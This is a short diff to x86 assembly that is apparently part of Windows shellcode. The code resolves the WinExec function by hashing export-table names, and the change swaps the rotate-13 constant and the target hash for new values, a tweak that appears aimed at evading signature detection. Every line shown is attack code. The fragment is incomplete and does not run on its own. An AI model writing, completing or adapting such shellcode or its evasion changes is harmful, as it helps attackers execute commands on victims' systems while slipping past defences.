@@ -40,11 +40,11 @@ funcaddr:
     lodsb                   ; Get next char
     test al, al             ; End of string?
     jz .hashcheck           ; Yes, go to check hash
-    ror edx, 0xd            ; ror hash
+    ror edx, 0x11           ; ror hash
     add edx, eax            ; add char to hash
     jmp .nameloop
 .hashcheck:
-    cmp edx, 0x0e8afe98     ; hash == "Winexec" hash?
+    cmp edx, 0x3c3e6889     ; hash == "Winexec" hash?
     jnz .tableloop
     pop edx
     pop eax
